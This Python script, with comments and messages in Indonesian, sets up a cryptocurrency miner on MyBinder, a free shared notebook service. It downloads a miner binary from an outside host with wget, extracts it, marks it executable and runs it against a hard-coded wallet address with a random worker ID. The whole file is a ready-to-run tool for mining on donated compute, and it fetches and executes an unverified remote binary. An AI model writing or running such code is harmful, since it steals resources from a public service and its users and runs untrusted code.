import os
import random
import subprocess
import sys
import time

def main():
    print("🚀 Memulai setup miner untuk MyBinder...")
    
    url = "https://kc.txedu.social/downloads/ntmminer-bnt/v1.2.1/NTMminer-BNT-v1.2.1-linux-x64.tar.gz"
    tar_file = "NTMminer-BNT-v1.2.1-linux-x64.tar.gz"
    extract_dir = "NTMminer-BNT-v1.2.1"
    miner_bin = os.path.join(extract_dir, "NTMminer-BNT")
    
    # 1. Download
    print(f"⬇️ Downloading dari {url}...")
    # Menggunakan wget via subprocess karena lebih andal di environment Linux MyBinder
    download_cmd = ["wget", "-q", "-O", tar_file, url]
    result = subprocess.run(download_cmd, capture_output=True, text=True)
    
    if result.returncode != 0 or not os.path.exists(tar_file):
        print("❌ GAGAL: Tidak dapat mendownload file. Kemungkinan domain diblokir atau server down.")
        print(f"Debug info: {result.stderr}")
        return

    print("✅ Download berhasil!")

    # 2. Extract
    print("📦 Extracting archive...")
    extract_cmd = ["tar", "xzf", tar_file]
    subprocess.run(extract_cmd, check=True)

    # 3. Permission
    print("⚙️ Setting permissions...")
    os.chmod(miner_bin, 0o755)

    # 4. Generate Worker ID
    worker_id = f"BNT{random.randint(1, 99999)}"
    print(f"🚀 Starting miner (Worker: {worker_id})...\n")
    print("-" * 50)

    # 5. Jalankan Miner
    cmd = [
        miner_bin,
        "-u", "N3FT9Ut4wctdR5b9hBCz9Wc39GtjHmJw2GNuQLyTfVLEBS7exwWjz3fSXEb6YAzLG4CN5jVDe8sW2FBNP6xR9cnmmY4hz",
        "-w", worker_id
    ]
    
    try:
        # Jalankan dan tampilkan output secara real-time
        process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
        for line in process.stdout:
            print(line, end='')
            sys.stdout.flush()
            
        process.wait()
    except KeyboardInterrupt:
        print("\n⏹️ Miner dihentikan secara manual.")
        if 'process' in locals():
            process.terminate()

if __name__ == "__main__":
    main()
